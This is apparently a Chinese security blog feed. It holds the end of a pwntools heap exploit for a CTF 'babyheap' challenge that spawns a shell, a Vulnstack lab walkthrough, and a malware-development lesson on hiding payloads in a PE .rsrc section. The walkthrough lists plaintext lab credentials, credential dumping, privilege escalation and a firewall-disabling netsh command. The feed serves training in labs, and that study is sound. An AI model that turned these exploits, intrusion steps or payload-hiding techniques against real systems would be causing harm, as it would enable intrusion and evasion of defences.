punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x108</span><span class="token punctuation">,</span><span class="token string">b'bbbb'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak'</span><span class="token punctuation">,</span>leak<span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x3c4b78</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>__free_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span>__malloc_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">)</span>__realloc_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__realloc_hook'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>target<span class="token operator">=</span>__malloc_hook<span class="token operator">-</span><span class="token number">0x28</span><span class="token operator">+</span><span class="token number">5</span>lg<span class="token punctuation">(</span><span class="token string">'target'</span><span class="token punctuation">,</span>target<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token string">b'x'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4527a</span><span class="token punctuation">,</span><span class="token number">0xf03a4</span><span class="token punctuation">,</span><span class="token number">0xf1247</span><span class="token punctuation">]</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>one<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ls<span class="token punctuation">(</span><span class="token string">'realloc'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'b'</span><span class="token operator">*</span><span class="token number">11</span><span class="token operator">+</span>payload<span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'How much do you want'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x4527a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL || &#123;[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...&#125; is a valid argv0xf03a4 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL || &#123;[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...&#125; is a valid argv0xf1247 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL || &#123;[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...&#125; is a valid argv'''</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./babyheap'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK红队评估实战靶场-5</title>
      <link href="/2024/11/21/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-5/"/>
      <url>/2024/11/21/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/7/">漏洞详情</a></p></blockquote><h1 id="网络搭建"><a href="#网络搭建" class="headerlink" title="网络搭建"></a>网络搭建</h1><p>只有两台机子，一个外网一个内网</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">win7sun\leo 123.comsun\Administrator dc123.com2008sun\admin 2020.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>win7启动phpstudy<br><img src="/Rxi134_FILE/37514640ca23b85c2139045439df833e_MD5.jpeg"></p><h1 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/Rxi134_FILE/bdc549cfcccaed50166046dc8a75eec1_MD5.jpeg"></p><h2 id="TP-tp5-construct-code-exec-1"><a href="#TP-tp5-construct-code-exec-1" class="headerlink" title="TP tp5_construct_code_exec_1"></a>TP tp5_construct_code_exec_1</h2><p>访问一下，一眼thinkphp<br><img src="/Rxi134_FILE/6a6fb455a71f3d0f7cb37dee1e0b7590_MD5.jpeg"></p><p>制造报错看下版本<br><img src="/Rxi134_FILE/4e90583701c7118f8126ee670d283af8_MD5.jpeg"></p><p>工具直接梭哈，命令无回显，挂个webshell<br><img src="/Rxi134_FILE/0ebd4784751b05b3d16fa72b9a1a8405_MD5.jpeg"><br><img src="/Rxi134_FILE/e8118b28dc98ebd577aa1926ea22166d_MD5.jpeg"></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>不是还有mysql吗，翻翻配置文件<br><img src="/Rxi134_FILE/a27437b3184c8bf057378695e642578e_MD5.jpeg"></p><h2 id="搭建socks隧道"><a href="#搭建socks隧道" class="headerlink" title="搭建socks隧道"></a>搭建socks隧道</h2><p>chisel失败，ew可以</p><h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><p>内网 ip 为 192.168.138.136，内网网段为 192.168.138.0&#x2F;24</p><h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><p>systeminfo</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">C:\phpStudy\PHPTutorial\WWW\public> systeminfo主机名:           WIN7OS 名称:          Microsoft Windows 7 专业版 OS 版本:          6.1.7601 Service Pack 1 Build 7601OS 制造商:        Microsoft CorporationOS 配置:          成员工作站OS 构件类型:      Multiprocessor Free注册的所有人:     Windows 用户注册的组织:       产品 ID:          00371-177-0000061-85581初始安装日期:     2020/3/5, 0:44:56系统启动时间:     2024/11/21, 15:14:49系统制造商:       VMware, Inc.系统型号:         VMware Virtual Platform系统类型:         x64-based PC处理器:           安装了 1 个处理器。                  [01]: Intel64 Family 6 Model 183 Stepping 1 GenuineIntel ~2419 MhzBIOS 版本:        Phoenix Technologies LTD 6.00, 2020/11/12Windows 目录:     C:\Windows系统目录:         C:\Windows\system32启动设备:         \Device\HarddiskVolume1系统区域设置:     zh-cn;中文(中国)输入法区域设置:   zh-cn;中文(中国)时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐物理内存总量:     2,047 MB可用的物理内存:   1,310 MB虚拟内存: 最大值: 4,095 MB虚拟内存: 可用:   3,168 MB虚拟内存: 使用中: 927 MB页面文件位置:     C:\pagefile.sys域:               sun.com登录服务器:       暂缺修补程序:         安装了 3 个修补程序。                  [01]: KB2534111                  [02]: KB2999226                  [03]: KB976902网卡:             安装了 3 个 NIC。                  [01]: Intel(R) PRO/1000 MT Network Connection                      连接名:      wk1 waiwang                      启用 DHCP:   是                      DHCP 服务器: 192.168.74.254                      IP 地址                        [01]: 192.168.74.160                        [02]: fe80::42a:7d55:e4d9:8eff                  [02]: Bluetooth 设备(个人区域网)                      连接名:      Bluetooth 网络连接                      状态:        媒体连接已中断                  [03]: Intel(R) PRO/1000 MT Network Connection                      连接名:      本地连接                      启用 DHCP:   否                      IP 地址                        [01]: 192.168.138.136                        [02]: fe80::38d3:8142:9a7e:bb5f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>域名 sun.com </p><p><img src="/Rxi134_FILE/fc299f05da8c84da0b0b383a7a32d6e6_MD5.jpeg"></p><p>administrator 不在域中<br><img src="/Rxi134_FILE/c935093ae5dcf2defb190e0d818f8eab_MD5.jpeg"></p><h2 id="提权至SYSTEM"><a href="#提权至SYSTEM" class="headerlink" title="提权至SYSTEM"></a>提权至SYSTEM</h2><p>CS：<br>token窃取可以直接提权，getsystem直接梭<br><img src="/Rxi134_FILE/743bc3f1526bfa6a151d604539160589_MD5.jpeg"></p><h2 id="密码抓取"><a href="#密码抓取" class="headerlink" title="密码抓取"></a>密码抓取</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">sun\administrator:dc123.comsun\leo:123.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>顺带进程注入到sun\leo</p><p><img src="/Rxi134_FILE/794a140928413875ea907ded1bd88157_MD5.jpeg"></p><h2 id="fscan大保健"><a href="#fscan大保健" class="headerlink" title="fscan大保健"></a>fscan大保健</h2><p><img src="/Rxi134_FILE/99aba2d4399562f7e9bcea3f9c03056c_MD5.jpeg"></p><p>用了一个魔改版的成功了<br><img src="/Rxi134_FILE/1562489a511af1ebb2e99073430d0b26_MD5.jpeg"></p><h2 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h2><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">netsh advfirewall set allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>msf exe没上线成功，用exe-small正连<br><img src="/Rxi134_FILE/685f5d6a9482e44b95b89ae6f2ad048c_MD5.jpeg"></p><h2 id="拿下DC"><a href="#拿下DC" class="headerlink" title="拿下DC"></a>拿下DC</h2><p>有了域管的账号实际已经是可以为所欲为了，后面省略</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnstack靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15.Payload Placement - .rsrc Section 有效负载放置</title>
      <link href="/2024/11/20/15.Payload%20Placement%20-%20.rsrc%20Section%20%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E6%94%BE%E7%BD%AE/"/>
      <url>/2024/11/20/15.Payload%20Placement%20-%20.rsrc%20Section%20%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E6%94%BE%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>将有效负载存储在 <code>.rsrc</code> 部分是一个非常好的选择，因为大多数实际的二进制文件都将它们的数据保存在这里。对于恶意软件作者来说，这也是一种更清晰的方法，因为较大的有效负载无法存储在 <code>.text</code> 或 <code>.data</code> 等部分中，因为它们有大小限制，这会导致在编译时 Visual Studio 出现错误。</p><p>例如，你的程序要生成一个exe文件，而文件的图标是你自定义的图标。你就要在这个工程里面添加Icon资源，添加一个外部的ico文件，保存到.rc里面，因此可以直接调用图标文件。</p><h1 id="rsrc-部分"><a href="#rsrc-部分" class="headerlink" title=".rsrc 部分"></a>.rsrc 部分</h1><p>以下步骤说明了如何将有效负载存储在 .rsrc 部分：</p><ol><li><p>在 Visual Studio 中，右键点击 ‘资源文件’，然后点击 添加 &gt; 新项。<br><img src="/Rxi134_FILE/88b39d76c3df4ee2d1f8c0edcb6bdd41_MD5.jpeg"></p></li><li><p>点击“资源文件”<br><img src="/Rxi134_FILE/a571851f25fefa5c067c0b032dfb1468_MD5.jpeg"></p></li><li><p>这将生成一个新的侧边栏，即资源视图。右键点击 <code>.rc</code> 文件（默认名称为 Resource.rc），然后选择 <strong>添加资源</strong> 选项。<br><img src="/Rxi134_FILE/ff6099a04cb0de581f9261e3abc6301b_MD5.jpeg"></p></li><li><p>点击 ‘导入’.<br><img src="/Rxi134_FILE/5774dcc6b25edccecbda14e6b840d132_MD5.jpeg"></p></li><li><p>选择 calc.ico 文件，它是重命名为扩展名 ..ico 的原始有效负载<br><img src="/Rxi134_FILE/07c919f5a20a71be52d69939824158e3_MD5.jpeg"></p></li><li><p>将出现一条提示，要求输入资源类型。输入不带引号的“RCDATA”。<br><img src="/Rxi134_FILE/0e1d8c86241e1617c36d2ab0fb80d571_MD5.jpeg"></p></li><li><p>单击“确定”后，有效负载应在 Visual Studio 项目中以原始二进制格式显示<br><img src="/Rxi134_FILE/dfe9c7a161f65b0223b10f4ded2a654b_MD5.jpeg"></p></li><li><p>退出资源视图时，“resource.h”头文件应该可见，并根据步骤 2 中的 .rc 文件命名。该文件包含一个定义语句，引用资源部分中有效负载的 ID (IDR_RCDATA1) 。这对于稍后能够从资源部分检索有效负载非常重要。<br><img src="/Rxi134_FILE/1fd5fe0ddbec8973a08c837d8e570f79_MD5.jpeg"></p></li></ol><hr><p>编译后，有效负载现在将存储在该部分中，但无法直接访问。相反，必须使用多个 WinAPI 来访问 .rsrc</p><ul><li><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-findresourcew">FindResourceW</a> - 获取存储在资源部分的指定数据的位置，该数据由传入的特殊 ID 指定（在头文件中定义）。</p></li><li><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource">LoadResource</a> - 检索资源数据的句柄。此句柄可用于获取指定资源在内存中的基地址。返回类型为 <strong>HGLOBAL</strong>。</p></li><li><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource">LockResource</a> - 从指定资源句柄中获取指向资源部分数据的指针。</p></li><li><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource">SizeofResource</a> - 获取资源部分中指定数据的大小。</p></li></ul><p>下面的代码片段将利用上述 Windows API 来访问资源部分，并获取有效载荷的地址和大小：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"resource.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>HRSRChRsrc                   <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>HGLOBALhGlobal                 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>PVOIDpPayloadAddress         <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>SIZE_TsPayloadSize            <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token comment">// 获取存储在 .rsrc 中的数据位置，通过其 ID *IDR_RCDATA1*</span>hRsrc <span class="token operator">=</span> <span class="token function">FindResourceW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token function">MAKEINTRESOURCEW</span><span class="token punctuation">(</span>IDR_RCDATA1<span class="token punctuation">)</span><span class="token punctuation">,</span> RT_RCDATA<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>hRsrc <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果函数失败</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] FindResourceW 调用失败，错误码: %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取 HGLOBAL，即指定资源数据的句柄，稍后需要调用 LockResource</span>hGlobal <span class="token operator">=</span> <span class="token function">LoadResource</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> hRsrc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>hGlobal <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果函数失败</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] LoadResource 调用失败，错误码: %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取 .rsrc 部分中有效载荷的地址</span>pPayloadAddress <span class="token operator">=</span> <span class="token function">LockResource</span><span class="token punctuation">(</span>hGlobal<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pPayloadAddress <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果函数失败</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] LockResource 调用失败，错误码: %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取 .rsrc 部分中有效载荷的大小</span>sPayloadSize <span class="token operator">=</span> <span class="token function">SizeofResource</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> hRsrc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sPayloadSize <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果函数失败</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] SizeofResource 调用失败，错误码: %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 打印指针和大小到屏幕上</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] pPayloadAddress 变量: 0x%p \n"</span><span class="token punctuation">,</span> pPayloadAddress<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] sPayloadSize 变量: %ld \n"</span><span class="token punctuation">,</span> sPayloadSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[#] 按 &lt;Enter> 键退出..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译并运行上述代码后，有效载荷的地址及其大小将被打印到屏幕上。需要注意的是，这个地址位于资源部分，该部分是只读内存，任何尝试在其中修改或编辑数据的操作都将导致访问冲突错误。如果要编辑有效载荷，必须分配一个与有效载荷大小相同的缓冲区，并将数据复制到该缓冲区。所有的修改（如解密有效载荷）都应在这个新缓冲区中进行。</p><h1 id="更新-rsrc-Payload"><a href="#更新-rsrc-Payload" class="headerlink" title="更新 .rsrc Payload"></a>更新 .rsrc Payload</h1><p>由于有效载荷不能直接从资源部分进行编辑，因此必须将其移动到一个临时缓冲区。为此，可以使用 <code>HeapAlloc</code> 分配与有效载荷大小相同的内存，然后通过 <code>memcpy</code> 